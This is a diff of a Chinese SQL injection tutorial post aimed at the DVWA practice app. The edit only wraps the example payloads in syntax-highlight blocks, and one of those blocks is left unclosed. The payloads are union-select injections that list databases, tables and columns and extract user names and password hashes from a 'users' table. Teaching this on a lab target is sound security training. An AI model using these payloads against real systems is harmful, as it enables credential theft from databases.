@@ -16,7 +16,9 @@ tags: SQL注入 渗透测试
 
 可以构造`union select`语句，来查询正在使用中的用户`user()`、数据库`database()`、数据库版本`version()`、服务器操作系统等信息`@@version_compile_os`，例如：
 
-`union select user(),database()+--+`
+{% highlight sql %}
+union select user(),database()+--+
+{% endhighlight %}
 
 ## 查询数据库用户名和密码
 
@@ -26,7 +28,9 @@ tags: SQL注入 渗透测试
 
 `information_schema.tables`为数据库名下表名`tables`记录所有数据库名下所有表名信息的表。
 
-`union select 1, group_concat(table_name) from information_schema.tables where table_schema=0x64767741+--+&Submit=Submit`
+{% highlight sql %}
+union select 1, group_concat(table_name) from information_schema.tables where table_schema=0x64767741+--+&Submit=Submit
+{% endhighlight %}
 
 这条语句表示联合查询满足数据库名为`information_schema`的库中的`tables`这个表，将其所有符合条件的字段，即属于`dvwa`库的表的信息都列出来
 
@@ -38,12 +42,16 @@ tags: SQL注入 渗透测试
 
 若已知表名`users`，想要查询其下面的列名，则需要用以下语句：
 
-`union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273+--+&Submit=Submit`
+{% highlight sql %}
+union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273+--+&Submit=Submit
+{% highlight sql %}
 
 其中`0x7573657273`为`users`的十六进制形式
 
 ### 查询用户名密码
 
-`union select user,password from users+--+&Submit=Submit`
+{% highlight sql %}
+union select user,password from users+--+&Submit=Submit
+{% endhighlight %}
 
 其中users为上一步查到的表名
